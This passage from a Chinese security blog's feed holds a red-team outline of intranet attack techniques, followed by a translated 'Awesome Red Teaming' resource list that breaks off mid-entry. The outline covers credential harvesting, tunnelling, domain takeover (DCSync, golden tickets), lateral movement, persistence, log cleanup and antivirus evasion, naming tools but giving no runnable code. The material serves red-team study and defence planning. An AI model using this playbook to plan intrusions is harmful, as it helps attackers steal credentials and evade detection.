系统日志即可大致判断\n\n</code></pre>\n<h2 id=\"0x07-内网安全-各类敏感凭证-搜集-与-窃取\"><a class=\"anchor\" href=\"#0x07-内网安全-各类敏感凭证-搜集-与-窃取\">#</a> 0x07 内网安全  [各类敏感凭证 &quot;搜集&quot; 与 &quot;窃取&quot;]</h2>\n<ul>\n<li>主动密码搜集</li>\n</ul>\n<pre><code>注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的\n此处不再赘述, 此项非防御重点, 因为压根也不好防\n\n批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot;\n   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...\n想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;\n   比如, *.ls,*.doc,*.docx, *.txt....\n抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码\n   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]\n\n抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]\n抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]\n抓取当前系统的所有 &quot;用户token&quot; [ Windows ]\n抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;\n抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;\n抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;\n抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]\n抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty\n抓取各类 &quot;浏览器中保存的各种web登录密码&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器\n抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;\n抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...\n抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...\n抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;\n抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot;\n\n\n</code></pre>\n<ul>\n<li>被动密码搜集 [等着管理员自己来送密码]</li>\n</ul>\n<pre><code>[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]\n\nWindows SSP [持久化/内存]\nHook PasswordChangeNotify [持久化/内存]\nOWA 登录账号密码截获\n截获mstsc.exe中输入的rdp连接账号密码\nlinux 别名记录利用\n本机明文密码嗅探 [ http,ftp,pop3... ]\n传统键盘记录\nwindows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]\n\n</code></pre>\n<ul>\n<li>Hash 爆破:</li>\n</ul>\n<pre><code>Hashcat [ 完全拼GPU ] \n\n</code></pre>\n<h2 id=\"0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点\"><a class=\"anchor\" href=\"#0x08-内网安全-内网常用-隧道-转发-代理-穿透手法-提炼汇总-防御重点\">#</a> 0x08 内网安全 [内网常用 &quot;隧道&quot;&quot; / &quot;转发&quot;&quot; / &quot;代理&quot;&quot; 穿透手法 提炼汇总 ，防御重点]</h2>\n<pre><code>出网流量刺探\n比如,http,dns,以及一些穿透性相对较好的tcp端口... \n这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器\n\n常规 HTTP脚本代理\nabptts,Neo-reGeorg,reGeorg,tunna,reduh...\n不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行\n\nSSH 隧道\n加密端口转发,socks 实战用途非常灵活,此处不细说 ]\n\nRdp 隧道\n\n反向SOCKS\nnps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks ... \n工具基本都不免杀了,需要自行处理\n\n正反向TCP 端口转发\n非常多,就不一一列举, eg: nginx,netsh,socat,ew....\n\nDNS加密隧道\t\t\t\n\nWeb端口复用\n\n需要明白的是,在一般的红队场景中\n入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性\n\n</code></pre>\n<h2 id=\"0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点\"><a class=\"anchor\" href=\"#0x09-域内网安全-域内常用攻击手法-域渗透-提炼汇总防御重点\">#</a> 0x09 域内网安全 [域内常用攻击手法 ( 域渗透)，提炼汇总，防御重点 ]</h2>\n<ul>\n<li>针对当前域的一些常规信息搜集 [其实现实中，只需要一个 BloodHound &amp; Pingcastle 足矣，就是工具需要自行事先免杀好]</li>\n</ul>\n<pre><code>获取当前域内的完整域管列表\n获取当前域内的所有域控机器名列表\n获取当前域内的所有DNS服务器机器名列表\n获取当前域内的所有SPN\n获取当前域内的所有OU\n获取当前域内的所有用户 &amp; 用户组列表\n获取当前域信任关系 [ 跨域渗透 ]\n获取当前域内所有机器的开机时间\n获取当前域内网段及web站点\n获取当前域内策略 [ 主要是为了了解密码策略 ]\n获取当前域林\n.......\n\n</code></pre>\n<ul>\n<li>快速获取目标域控权限的一些常规手法</li>\n</ul>\n<pre><code>搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] \n服务票据hash破解(&quot;尤其是域管用户的&quot;) [ kerberoast ]\n批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]\nKerberos 委派利用\n爆破LDAP\nExchange特定ACL滥用\nSSP 截获关键服务器登录密码\n利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至\n  抓到域管密码\n  抓到域管令牌\nDNSAdmin 组成员滥用 [ 加载执行恶意dll ]\nLAPS\nMS14-068 [ 如今实际中已很少遇到了 ]\nLLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]\n\n</code></pre>\n<ul>\n<li>域内后渗透敏感信息搜集分析</li>\n</ul>\n<pre><code>获取所有DNS记录\n导出当前域的完整LDAP数据库\n提取当前域的ntds.dit [ 域内账号密码数据库 ]\n  Dcsync同步\n  Volume Shadow Copy Service\n\n</code></pre>\n<ul>\n<li>域内指定用户登录 ip 定位</li>\n</ul>\n<pre><code>利用OWA登录日志\n利用域控服务器登录日志\n指定服务银票 [ Silver Ticket ]\n除此之外,就是下面的各类常规横向手法\n\n</code></pre>\n<ul>\n<li>域内指定用户机器定向控制技巧</li>\n</ul>\n<pre><code>绑定用户登录脚本\n利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]\nPTT [ 票据传递 ]\n\n</code></pre>\n<ul>\n<li>针对域管的各种权限维持技巧</li>\n</ul>\n<pre><code>金票\nSkeleton Key\nDSRM密码同步\nOWA后门\n...\n\n</code></pre>\n<ul>\n<li>域内 Exchange 邮件数据脱取</li>\n</ul>\n<pre><code>利用Ews接口通过PTH的方式脱邮件\n\n</code></pre>\n<h2 id=\"0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重\"><a class=\"anchor\" href=\"#0x10-内网安全-跨平台横向渗透-远程执行防御重点-重中之重\">#</a> 0x10 内网安全 [跨平台横向渗透 (远程执行)，防御重点 ( &quot;重中之重&quot; ) ]</h2>\n<ul>\n<li>从 Windows 平台 横向至  Windows 平台</li>\n</ul>\n<pre><code>注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限\n\n远程服务管理 [ SCM ]\n远程创建执行计划任务 [ Scheduled Tasks ]\nWMI 远程执行 [ WMI ]\n针对高版本Windows 的WinRM 远程执行 \nDCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]\n高版本 RDP 远程执行\n利用MSSQL数据库存储过程来变相远程执行\n利用Oracle数据库存储过程来变相远程执行\nSMB [ PTH (hash传递) ]\nRDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]\n利用补丁服务器下发执行\n利用EDR主控端定向下发执行\n\n</code></pre>\n<ul>\n<li>从 Windows 平台 横向至 *inux 平台</li>\n</ul>\n<pre><code>plink 或者 基于Windows SSH库自行开发各种远程执行小工具\n\n</code></pre>\n<ul>\n<li>从 *inux 平台 横向至 Windows 平台</li>\n</ul>\n<pre><code>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下\nwmiexec_linux_x86_64\nsmbexec_linux_x86_64\npsexec_linux_x86_64\natexec_linux_x86_64\ndcomexec_linux_x86_64\n\n另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行\n\n</code></pre>\n<ul>\n<li>从 *inux 平台 横向至 *inux 平台</li>\n</ul>\n<pre><code>linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行\n\n</code></pre>\n<ul>\n<li>各种远程下载技巧</li>\n</ul>\n<pre><code>wget [ win &amp; linux ]\ncurl [ win &amp; linux ]\n\n</code></pre>\n<pre><code>之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道\n某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可\n\nCertUtil.exe\nBitsadmin.exe\nRegsvr32.exe\nRundll32.exe\nPowershell.exe\n......\n\n</code></pre>\n<h2 id=\"0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明\"><a class=\"anchor\" href=\"#0x11-内网安全-权限维持防御重点-注-有些细节此处并未展开详细说明\">#</a> 0x11 内网安全 [权限维持，防御重点] [ 注：有些细节此处并未展开详细说明 ]</h2>\n<ul>\n<li>边界入口权限维持</li>\n</ul>\n<pre><code>OWA 登录口 [ 账号密码,webshell ]\nVPN 登录口 [ 账号密码,shell ]\n其他 MAIL 登录口 [ 账号密码 ]\n边界 Web服务器 [ Webshell 驻留技巧 ]\n边界路由交换设备 [ 账号密码,shell ]\n...\n\n</code></pre>\n<ul>\n<li>Windows 单机系统维持 [临时]</li>\n</ul>\n<pre><code>系统计划任务 [ 高权限/低权限 ]\n常规注册表自启动项 [ 用户权限/system权限 ]\nMssql存储过程 [ 继承服务权限 ]\nWMI\nWinlogon\nCLR\nLogon Scripts\nMruPidlList\nMof\n传统远控\n...\n\n</code></pre>\n<ul>\n<li>linux 单机系统维持 [临时]</li>\n</ul>\n<pre><code>Patch SSH\n替换各类基础服务so [ PAM,Nginx,Rsync ...] \n系统计划任务\n传统应用层远控\n驱动层远控( 针对特定内核版本 )\n\n</code></pre>\n<h2 id=\"0x12-痕迹处理\"><a class=\"anchor\" href=\"#0x12-痕迹处理\">#</a> 0x12 痕迹处理</h2>\n<pre><code>web日志 [ 访问, 错误日志 ]\n数据库日志 [ 异常连接日志,慢查询日志 ]\n系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]\n各类邮箱登录日志\n域内敏感攻击利用日志 [ 金票,银票... ]\n此项为专业蓝队范畴,不再赘述\n......\n\n</code></pre>\n<h2 id=\"0x13-各类常用-c2-渗透-框架\"><a class=\"anchor\" href=\"#0x13-各类常用-c2-渗透-框架\">#</a> 0x13 各类常用 C2 / 渗透 框架</h2>\n<pre><code>CobaltStrike [二次开发]\n  payload(beacon) 逆向/改进重写\nMetasploit [二次开发]\n......\n\n</code></pre>\n<h2 id=\"0x14-各类常用-webshell管理工具\"><a class=\"anchor\" href=\"#0x14-各类常用-webshell管理工具\">#</a> 0x14 各类常用 Webshell 管理工具</h2>\n<pre><code>菜刀\tcaidao20160622\n冰蟹\tBehinder_v2.0.1\n蚁剑\tAntSword\n......\n\n</code></pre>\n<h2 id=\"0x15-免杀-及-各类防火墙对抗\"><a class=\"anchor\" href=\"#0x15-免杀-及-各类防火墙对抗\">#</a> 0x15 免杀 及 各类防火墙对抗</h2>\n<ul>\n<li>静态</li>\n</ul>\n<pre><code>混淆:\n手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....\n工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]\n...\n\n加壳:\n一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]\n最好的方式还是尝试自己写壳,就是成本较高\n...\n\n</code></pre>\n<ul>\n<li>动态</li>\n</ul>\n<pre><code>反射\nshellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )\n白利用\n......\n\n注:\n   理论上, 这些应该也没有什么非常通用的方法\n   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药\n\n</code></pre>\n<ul>\n<li>流量:</li>\n</ul>\n<pre><code>域前置[利用大厂cdn]\nDNS加密隧道\n第三方公共邮箱上线\n第三方网盘上线\n第三方社交网站上线\n第三方匿名社交工具上线[eg: tg机器人,tor...]\n\n</code></pre>\n",
            "tags": [
                "RedTeam"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/Awesome-Red-Teaming/",
            "title": "Awesome Red Teaming【转】",
            "date_published": "2021-01-18T07:02:37.000Z",
            "content_html": "<h1 id=\"awesome-red-teaming\"><a class=\"anchor\" href=\"#awesome-red-teaming\">#</a> Awesome Red Teaming</h1>\n<p>一个最好的红队资源清单</p>\n<p>此列表同样适用于希望了解红队但没有相关知识储备的人</p>\n<p>无论如何，这是一个活跃的列表，会定期更新最新的对抗策略与技术</p>\n<p>你可以通过发起 PR 来添加更多有用信息！</p>\n<h1 id=\"目录\"><a class=\"anchor\" href=\"#目录\">#</a> 目录</h1>\n<ul>\n<li><a href=\"#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B\">社会工程</a></li>\n<li><a href=\"#-osint\">OSINT</a></li>\n<li><a href=\"#%E6%8A%95%E9%80%92\">投递</a></li>\n<li><a href=\"#%E6%A4%8D%E5%85%A5\">植入</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\">横向移动</a></li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6\">命令控制</a></li>\n<li><a href=\"#%E5%B5%8C%E5%85%A5%E5%BC%8F%E4%B8%8E%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87\">嵌入式与物理设备</a></li>\n<li><a href=\"#%E6%9D%82%E9%A1%B9\">杂项</a></li>\n<li><a href=\"#%E7%94%B5%E5%AD%90%E4%B9%A6%E7%B1%8D\">电子书籍</a></li>\n<li><a href=\"#%E5%9F%B9%E8%AE%AD\">培训</a></li>\n<li><a href=\"#%E8%AE%A4%E8%AF%81\">认证</a></li>\n</ul>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> <a href=\"#table-of-contents\">↑</a> 社会工程</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29jaWFsLWVuZ2luZWVyLm9yZy8=\">社会工程门户网站</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kYXJrcmVhZGluZy5jb20vdGhlLTctYmVzdC1zb2NpYWwtZW5naW5lZXJpbmctYXR0YWNrcy1ldmVyL2QvZC1pZC8xMzE5NDEx\">7 个最好的社会工程攻击案例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnNhY29uZmVyZW5jZS5jb20vd3JpdGFibGUvcHJlc2VudGF0aW9ucy9maWxlX3VwbG9hZC9kYXMtMzAxX3dpbGxpYW1zX3JhZGVyLnBkZg==\">在大数据中使用社会工程策略 - RSA Conference Europe 2012</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnL0RFRiUyMENPTiUyMDI0L0RFRiUyMENPTiUyMDI0JTIwcHJlc2VudGF0aW9ucy9ERUZDT04tMjQtU2V5bW91ci1UdWxseS1XZWFwb25pemluZy1EYXRhLVNjaWVuY2UtRm9yLVNvY2lhbC1FbmdpbmVlcmluZy1XUC5wZGY=\">为社会工程武装数据科学：Twitter 中的自动 E2E 鱼叉式网络钓鱼 - Defcon 23</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2ltYWdlcy81LzU0L1ByZXNlbnRhdGlvbl9Tb2NpYWxfRW5naW5lZXJpbmcucGRm\">OWASP 社会工程介绍 - OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdXNiLWRyb3AtYXR0YWNrcy10aGUtZGFuZ2VyLW9mLWxvc3QtYW5kLWZvdW5kLXRodW1iLWRyaXZlcy8=\">USB 丢失攻击：USB 设备丢失与发现的危险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlZHRlYW1zZWN1cml0eS9QeVBoaXNoaW5n\">PyPhishing 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3NjaGVkdWxlLmNvbS9ibG9nL2Jlc3QtdGltZS10by1zZW5kLWVtYWlsLw==\">发送电子邮件的最佳时间</span></li>\n</ul>\n<h2 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> <a href=\"#table-of-contents\">↑</a> OSINT</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL2F3ZXNvbWUtb3NpbnQ=\">最好的 OSINT 列表</span> - 覆盖了很多 OSINT 资源</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNy9yZWNvbm5haXNzYW5jZS11c2luZy1saW5rZWRpbnQv\">使用 LinkedInt 进行侦察</span></li>\n</ul>\n<h2 id=\"-3\"><a class=\"anchor\" href=\"#-3\">#</a> <a href=\"#table-of-contents\">↑</a> 投递</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS9oZWxwLXNwZWFyLXBoaXNo\">Cobalt Strike - 鱼叉式网络钓鱼文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8xMi8xNy93aGF0cy10aGUtZ28tdG8tcGhpc2hpbmctdGVjaG5pcXVlLW9yLWV4cGxvaXQv\">Cobalt Strike - 什么是钓鱼？如何利用？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WN1VKalZjcTJBbw==\">使用 Cobalt Strike 进行网络钓鱼 - Raphael Mudge</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDcvMTMvcGhpc2hpbmctYWdhaW5zdC1wcm90ZWN0ZWQtdmlldy8=\">针对受保护的视图进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTUvMDYvdmVpbC1ldmFzaW9uLWFlcy1lbmNyeXB0ZWQtaHR0cGtleS1yZXF1ZXN0LW1vZHVsZS8=\">VEIL-EVASION 的 AES 加密 HTTPKEY 请求：沙盒逃逸</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTIvZWdyZXNzaW5nLWJsdWVjb2F0LXdpdGgtY29iYWx0c3Rpa2UtbGV0c2VuY3J5cHQv\">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET'S ENCRYPT</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMDUvZW1haWwtcmVjb25uYWlzc2FuY2UtcGhpc2hpbmctdGVtcGxhdGUtZ2VuZXJhdGlvbi1tYWRlLXNpbXBsZS8=\">电子邮件侦察与钓鱼邮件模版生成</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8xNC9hbi11bm5lY2Vzc2FyeS1hZGRpY3Rpb24tdG8tZG5zLWNvbW11bmljYXRpb24v\">不必依赖 DNS 通信</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9menVja2VybWFuLndvcmRwcmVzcy5jb20vMjAxNi8xMC8wNi9wb3dlcnNoZWxsLWVtcGlyZS1zdGFnZXJzLTEtcGhpc2hpbmctd2l0aC1hbi1vZmZpY2UtbWFjcm8tYW5kLWV2YWRpbmctYXZzLw==\">POWERSHELL EMPIRE 策略 1: 使用 Office 宏指令进行钓鱼与逃避杀软</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3BoaXNoaW5nLXdpdGgtcG93ZXJwb2ludC8=\">使用 PowerPoint 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTYvMDMvMTUvcGhpc2hpbmctd2l0aC1lbXBpcmUv\">使用 EMPIRE 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zaXhkdWIubmV0Lz9wPTYyNw==\">Empire 与工具多样性：整合是关键</span></li>\n</ul>\n<h2 id=\"-4\"><a class=\"anchor\" href=\"#-4\">#</a> <a href=\"#table-of-contents\">↑</a> 植入</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNC9leHBsb2l0aW5nLWN2ZS0yMDE3LTAxOTktaHRhLWhhbmRsZXItdnVsbmVyYWJpbGl0eS8=\">CVE-2017-0199: HTA 处理漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JoZHJlc2gvQ1ZFLTIwMTctMDE5OQ==\">CVE-2017-0199 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0NWRS0yMDE3LTg3NTktRXhwbG9pdC1zYW1wbGU=\">CVE-2017-8759 Exploit 示例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1dpbmRvd3MtU2lnbmVkQmluYXJ5\">签名 Window 二进制程序</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vdG9vbHMvd2Vwd25pc2Uv\">Wepwnise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWtzaG9wLmNvbS9wcm9kdWN0cy9iYXNoLWJ1bm55\">Bash Bunny</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VuaWdtYTB4My9HZW5lcmF0ZS1NYWNybw==\">生成宏的工具</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2VtcGlyZXMtY3Jvc3MtcGxhdGZvcm0tb2ZmaWNlLW1hY3JvLw==\">Empire 中的跨平台 Office 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly80c3lzb3BzLmNvbS9hcmNoaXZlcy9leGNlbC1tYWNyb3Mtd2l0aC1wb3dlcnNoZWxsLw==\">使用 PowerShell 执行 Excel 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9waGlzaG1lLmNvbS9wb3dlcnBvaW50LWFuZC1jdXN0b20tYWN0aW9ucy8=\">PowerPoint 与自定义行为</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL1NpZ1RoaWVm\">三步签名 mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXNjeWJ1c2luZXNzLndvcmRwcmVzcy5jb20vMjAxNy8xMC8wNy9oaWRpbmcteW91ci1wcm9jZXNzLWZyb20tc3lzaW50ZXJuYWxzLw==\">在 sysinternals 中隐藏你的进程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hlbGxudGVsLmNvbS9ibG9nLzIwMTYvOS8xMy9sdWNreXN0cmlrZS1hLWRhdGFiYXNlLWJhY2tlZC1ldmlsLW1hY3JvLWdlbmVyYXRvcg==\">Luckystrike: 邪恶 Office 文档生成器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==\">被低估的 CSV 注入风险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9tYWNyby1sZXNzLWNvZGUtZXhlYy1pbi1tc3dvcmQv\">MSWord 中无宏代码执行</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYWxjb212ZXR0ZXIvbXVsdGktcGxhdGZvcm0tbWFjcm8tcGhpc2hpbmctcGF5bG9hZHMtM2I2ODhlOGVmZjY4\">跨平台宏钓鱼载荷</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mdXJvbmVyLndvcmRwcmVzcy5jb20vMjAxNy8xMC8xNy9tYWNyb2xlc3MtbWFsd2FyZS10aGF0LWF2b2lkcy1kZXRlY3Rpb24td2l0aC15YXJhLXJ1bGUvYW1wLw==\">Macroless DOC 恶意软件躲避 Yara 规则</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibmVnLmlvLzIwMTcvMDcvMjYvZW1waXJlLXdpdGhvdXQtcG93ZXJzaGVsbC1leGUv\">无 Powershell 的 Empire</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3Bvd2Vyc2hlbGwtd2l0aG91dC1wb3dlcnNoZWxsLWhvdy10by1ieXBhc3MtYXBwbGljYXRpb24td2hpdGVsaXN0aW5nLWVudmlyb25tZW50LXJlc3RyaWN0aW9ucy1hdi8=\">无 Powershell 的 Powershell 来绕过应用程序白名单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZhbWkvcGhpc2hpbmctYmV0d2Vlbi10aGUtYXBwLXdoaXRlbGlzdHMtMWI3ZGNkYWI0Mjc5\">应用程序白名单的钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy1zY3JpcHQuaHRtbA==\">绕过应用程序白名单脚本保护 -  Regsvr32.exe 与 COM 脚本 (.sct 文件)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzaW5nLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy5odG1s\">使用 MSBuild.exe 绕过应用程序白名单 - Device Guard 示例与缓解措施</span></li>\n</ul>\n<h2 id=\"-5\"><a class=\"anchor\" href=\"#-5\">#</a> <a href=\"#table-of-contents\">↑</a> 横向移动</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNi8xMi9jbmEtZXZlbnR2d3ItdWFjLWJ5cGFzcy8=\">Eventvwr File-less UAC Bypass CNA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDkvMTEvbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1leGNlbC1hcHBsaWNhdGlvbi1hbmQtZGNvbS8=\">使用 Excel 与 dcom 进行横向移动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3dzaC1pbmplY3Rpb24tYS1jYXNlLXN0dWR5LWZkMzVmNzlkMjlkZA==\">WSH 注射案例研究</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ZpbGVsZXNzLXVhYy1ieXBhc3MtdXNpbmctc2RjbHQtZXhlLTNlOWY5YWQ0ZTJiMw==\">Fileless UAC Bypass using sdclt</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2J5cGFzc2luZy1hbXNpLXZpYS1jb20tc2VydmVyLWhpamFja2luZy1iOGEzMzU0ZDFhZmY=\">劫持 COM 服务器绕过 AMSI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvRGV2aWNlR3VhcmRCeXBhc3Nlcw==\">绕过 Window 10 的 Device Guard</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMi8xNC9teS1maXJzdC1nby13aXRoLWJsb29kaG91bmQv\">My First Go with BloodHound</span></li>\n<li><span class=\"exturl\" 